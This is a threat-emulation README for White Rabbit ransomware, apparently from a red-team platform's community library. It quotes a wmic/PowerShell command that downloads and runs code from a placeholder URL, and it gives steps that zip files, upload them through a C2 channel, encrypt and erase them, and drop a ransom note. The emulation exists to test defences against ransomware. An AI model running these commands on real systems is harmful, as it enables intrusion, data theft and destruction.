# White Rabbit

## Cyber Threat Intelligence
White Rabbit was first observed attacking a US bank in December 2021 using double extortion techniques similar to [Egregor](https://github.com/scythe-io/community-threats/tree/master/Egregor).[^1] As a relateively new ransomware group, TTPs and cyber threat intelligence is not as abundant and available as other ransomware threats. This threat emulates the adversary at the technique level.

## Automated Emulation
1. Download and import the threat in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under WhiteRabbit/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/WhiteRabbit
4. Create a new campaign with HTTPS.
5. Import from Existing Threat: WhiteRabbit_v1
6. Launch the Campaign
7. As per CTI, execution of White Rabbit was done using ```wmic process call create "cmd /c powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString ('https://payloadurl/')"```

## Manual Emulation
Launch a campaign with the C2 parameters you desire. Once you have a shell, execute the following procedures:
```
loader --load run
run cmd /c mkdir "%USERPROFILE%\Desktop\WhiteRabbit"
loader --load file
file --create --path "%USERPROFILE%\Desktop\WhiteRabbit\important_files.doc" --size 2MB --count 50
run powershell "Compress-Archive -Path $env:userprofile\Desktop\WhiteRabbit -CompressionLevel Optimal -Destination $env:userprofile\Desktop\WhiteRabbit\exfil.zip"
loader --load uploader
uploader --remotepath "%USERPROFILE%\Desktop\WhiteRabbit\exfil.zip"
loader --load crypt
crypt --target "%USERPROFILE%\Desktop\WhiteRabbit\" --encrypt --password "Wh1teR4bb1t" --erase --recurse
loader --load downloader
downloader --src "VFS:/shared/threats/WhiteRabbit/README.scrypt.txt" --dest "%USERPROFILE%\Desktop\WhiteRabbit\README.scrypt.txt"
run wmic process call create "cmd /c powershell.exe -nop -ep bypass notepad.exe $env:userprofile\Desktop\WhiteRabbit\README.scrypt.txt"
run cmd /c rmdir /Q /S %USERPROFILE%\Desktop\WhiteRabbit"
```

## References
- [TrendMicro](https://www.trendmicro.com/en_us/research/22/a/new-ransomware-spotted-white-rabbit-and-its-evasion-tactics.html)

[^1]: [TrendMicro](https://www.trendmicro.com/en_us/research/22/a/new-ransomware-spotted-white-rabbit-and-its-evasion-tactics.html)